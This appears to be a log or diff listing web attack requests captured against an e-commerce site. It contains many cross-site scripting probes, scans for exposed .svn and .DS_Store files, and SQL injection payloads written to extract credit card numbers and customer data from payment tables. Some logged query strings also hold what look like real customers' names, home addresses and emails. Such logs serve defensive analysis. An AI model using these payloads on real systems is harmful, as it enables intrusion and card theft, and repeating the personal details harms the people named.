+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_archive/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000049')</script>
+attack:5  /_utils/.svn/entries
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CE')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F9')</script>
+attack:5  /lib/editor/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:5  /_utils/.DS_Store
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_mem_bin/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Scripts/customjsbundle?v=<script>alert('TK00000128')</script>
+attack:5  /_derived/.DS_Store
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000058')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EB')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000026')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FF')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E4')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FD')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.7.2/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.6.5/<script>document.cookie="testxjwa=7156;"</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.8.1/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(payment_cards_id,":",cc_number) FROM orders where LIMIT 7,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C4')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_cti_pvt/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Content/themes/base/cssbundle?v=<script>alert('TK0000010D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000057')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BD')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/mod_status?<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.6.2/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000091')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000087')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F7')</script>
+attack:5  /Scripts/modernizrbundle?v=<script>alert('TK0000011D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004E')</script>
+attack:5  /Content/css/cssbundle?v=<script>alert('TK00000107')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001F')</script>
+attack:5  /SMSReporting_XYZ/.svn/entries
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D5')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CF')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A6')</script>
+attack:5  /Scripts/modernizrbundle?<script>alert('TK00000119')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000072')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000060')</script>
+attack:6  /Campaign/Error/NotFound?aspxerrorpath=/campaign/(f(2ewt_ygmarlagti7sw4tvhj0zk17klgxnhnk1aawgtixm5x-2qmvsvouolvaffrhitumf4wnk496p2dbzmkc3ywfloksiixdtrlawmt78f_mg-45kdzzpdlnogeishkcgtotelf6gqmu2ia0i1j5lfgmcvw1))/home/index
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A5')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000016')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CC')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D7')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000045')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000034')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000097')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E6')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000010')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C2')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000059')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D6')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000088')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000068')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000095')</script>
+attack:5  /Scripts/modernizrbundle?v=<script>alert('TK0000011F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B2')</script>
+attack:5  /Content/themes/base/cssbundle?v=<script>alert('TK00000110')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008E')</script>
+attack:5  /admin/.DS_Store
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_utils/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Content/css/cssbundle?v=<script>alert('TK00000106')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E2')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DA')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BF')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/SMSReporting_XYZ/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006C')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_fpclass/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EF')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C8')</script>
+attack:5  /redeem/Content/Css/..images/bd-drinks.jpg
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008F')</script>
+attack:5  /lib/spaw/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AC')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000070')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000086')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_old/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003D')</script>
+attack:5  /_cti_pvt/.DS_Store
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000062')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A9')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000065')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000096')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000027')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A0')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BC')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000077')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_cti_pvt/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000041')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.7.1/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DF')</script>
+attack:5  /_archive/.DS_Store
+attack:5  /content/.svn/entries
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_notes/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000074')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000042')</script>
+attack:5  /_cti_pvt/.svn/entries
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EC')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F5')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CD')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A2')</script>
+attack:6  /corporate_info.php?content=corp_mgt' or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- 'x'='x
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000030')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B5')</script>
+attack:6  /campaign/(f(2ewt_ygmarlagti7sw4tvhj0zk17klgxnhnk1aawgtixm5x-2qmvsvouolvaffrhitumf4wnk496p2dbzmkc3ywfloksiixdtrlawmt78f_mg-45kdzzpdlnogeishkcgtotelf6gqmu2ia0i1j5lfgmcvw1))/home/index
+attack:6  /corporate_info.php?content=corp_mgt or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- and 1=1
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000039')</script>
+attack:6  /corporate_info.php?content=corp_mgt" or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- "x"="x
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000056')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A7')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000022')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000040')</script>
+attack:5  /$.extend({},
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.61/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E9')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000012')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002B')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.7.2/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Content/css/cssbundle?v=<script>alert('TK00000105')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FB')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000051')</script>
+attack:5  /Scripts/modernizrbundle?v=<script>alert('TK0000011E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FA')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D4')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DB')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.6.5/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Content/themes/base/cssbundle?<script>alert('TK00000109')</script>
+attack:5  /admin/spaw2/dialogs/dialog.php?module=spawfm&dialog=spawfm&theme=spaw2lite&type=imagesundefined
+attack:5  /Scripts/jquerybundle?v=<script>alert('TK00000115')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000081')</script>
+attack:5  /Admin/Account/Login?ReturnUrl=/Admin&utm_source=SUM 503&utm_campaign=2b9d4f7c61-SNAP-2015-10-17 17:58:32&utm_medium=email&utm_term=0_fa50f40495-2b9d4f7c61-[LIST_EMAIL_ID]&ct=t(SNAP-2015-10-17 17:58:32)&goal=0_fa50f40495-2b9d4f7c61-[LIST_EMAIL_ID]&mc_cid=2b9d4f7c61&mc_eid=[UNIQID]
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000A')</script>
+attack:5  /Error/NotFound?<script>alert('TK00000006')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000035')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000052')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000038')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000019')</script>
+attack:6  /corporate_info.php?content=corp_mgt'&&BeNChMaRK(2999999,mD5(NOW()))&&'1
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005E')</script>
+attack:5  /_backup/.svn/entries
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AB')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.61/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000055')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000061')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000023')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000050')</script>
+attack:5  /content/.DS_Store
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000092')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D0')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000009')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.8/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Home/Index?<script>alert('TK0000012A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000ED')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E5')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_backup/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000078')</script>
+attack:5  /Scripts/customjsbundle?v=<script>alert('TK00000125')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000080')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000064')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000054')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000093')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C0')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_derived/<script>document.cookie="testxjwa=7156;"</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_notes/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B9')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.7.1/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000073')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000083')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000047')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_fpclass/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B7')</script>
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(customers_id,":",cc_number) FROM orders LIMIT 0,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000037')</script>
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(customers_id,":",cc_number) FROM orders LIMIT 3,1)))--
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_pages/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F2')</script>
+attack:5  /config/.config_ucenter.php.swp
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000031')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AA')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_utils/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F6')</script>
+attack:5  /includes/spaw/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_backup/<script>document.cookie="testxjwa=7156;"</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/mod_status?<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DC')</script>
+attack:5  /Content/themes/base/cssbundle?v=<script>alert('TK0000010F')</script>
+attack:5  /Content/themes/base/cssbundle?v=<script>alert('TK0000010E')</script>
+attack:5  /Scripts/jquerybundle?<script>alert('TK00000111')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C9')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003F')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_errors/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000029')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F8')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000036')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000028')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FC')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B1')</script>
+attack:5  /Scripts/jquerybundle?<script>alert('TK00000112')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000B')</script>
+attack:5  /Content/css/cssbundle?<script>alert('TK00000101')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000066')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_objects/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F4')</script>
+attack:5  /_errors/.svn/entries
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000067')</script>
+attack:5  /admin/.svn/entries
+attack:5  /Scripts/jquerybundle?v=<script>alert('TK00000118')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000011')</script>
+attack:5  /Content/css/cssbundle?<script>alert('TK00000102')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E7')</script>
+============================================
+sqli Attack: SQL Injection 
+
+attack:6  /change_payment_card.php?order_id=51465722 and(select 1 from(select count(*),concat((select (select concat(payment_cards_id,"|",customers_id,"|",cc_type,"|",cc_number_display,"|",cc_expires,"|",address_book_id)) from bdgweb_oscsmartsubinnodb.payment_cards order by payment_cards_id desc limit 0,1),floor(rand(0)*2))x from bdgweb_oscsmartsubinnodb.payment_cards group by x)a) and 1=1--
+attack:5  /Express/default.aspx?partnerId=REDACTEDP00001&sfn=KIMBERLY&sln=HIX&sa1=822 NELSON KILE ROAD&sa2=&sc=DALTON&ss=GA&sz=30721&se=hix@windstream.net&models=3592,&t==VGMyMFV2ME83YkdFVmxwTVQwa"\x01"WDVJK0xieThIQ2U=
+attack:6  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(customers_id,":",cc_number) FROM orders LIMIT 7,1)))--
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/uNhEx(/**/hEx(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!")))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:6  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(payment_cards_id,":",cc_number) FROM orders LIMIT 7,1)))--
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT aes_decrypt(aes_encrypt(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!"),1),1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:6  /Express/default.aspx?partnerId=INBOXDOLLARSSTSP00007&partnerOrderId=ibd2087918"\u0013!8)\""&t=ichN4K37hPTLG8EJgadYOmAK6b7JseHN
+attack:5  /Express/default.aspx?partnerId=REDACTEDP00001&sfn=emily&sln=masters&sa1=484 hospital hill road&sa2=&sc=mountain city&ss=TN&sz=37683&se=emastersavon@yahoo.com&models=9826,&t==VGMyMFV2ME83YkhNZWR4b"\x06"OVRRK2locW5iSDRyNUI=
+attack:6  /express/defaultr.aspx?partnerId=INBOXDOLLARSSTSP00007&partnerOrderId=ibd2087918"\u0013!8)\""
+attack:7  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(":",cc_number) FROM orders where customers_id = 18400099 LIMIT 7,1)))--
+attack:6  /modules/Submit/index.php?op=pre&title=<script>alert("test");</script>
+attack:7  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(":",cc_number) FROM orders where payment_cards_id = 0 LIMIT 964175,1)))--
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cAsT(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!") as char)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:6  /calendar.php?year=2011&month="<script>alert("Trustkeeper")</script>&day=01
+attack:5  /Express/default.aspx?partnerId=REDACTEDP00001&sfn=Diana&sln=Rivera&sa1=PO Box 904&sa2=&sc=Utuado&ss=PR&sz=00641&se=dirn_14@hotmail.com&models=3592,&t==dHFpd2Fmc2htN0tFVmxwTVQwa"\x01"ZG9ady9DQlZlcW8=
+attack:5  /Express/default.aspx?partnerId=REDACTEDP00001&sfn=Shawn&sln=Fordyce&sa1=3222 keays Ave &sa2=&sc=Middletown &ss=OH&sz=45044&se=Shawn.fordyce.3@gmail.com&models=67,&t==WjRRR3VQdFRqQUV6WHZMTzVqa"\v"LzNoMFc1cFFia0s=
+attack:6  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(payment_cards_id,":",cc_number) FROM orders where LIMIT 7,1)))--
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnVeRt(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!") using utf8)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:6  /Express/default.aspx?partnerId=REDACTEDSTSP00001&sfn=Sharon&sln=Gottschalk&sa1=South 926 U.S. Hwy 41&sa2=&sc=Stephenson&ss=MI&sz=49887&se=sgottschalk75@hotmail.com&t==a1NodFJlejllQXdZcitjV"^"HZDTllIVm04QTJneDQ=
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT uncompress(compress(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!")))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:6  /corporate_info.php?content=corp_mgt' or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- 'x'='x
+attack:6  /corporate_info.php?content=corp_mgt or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- and 1=1
+attack:7  /corporate_info.php?content=corp_mgt" or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- "x"="x
+attack:5  /Express/default.aspx?partnerId=REDACTEDP00001&sfn=reagan&sln=Castillo&sa1=27621 Villa Ave&sa2=&sc=Highland&ss=CA&sz=92346&se=reagancastillo123@gmail.com&models=4496,&t=VvzaJeGelad06Uts8jY"\f"gqBBMHLvqn
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnVeRt(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!") using latin1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
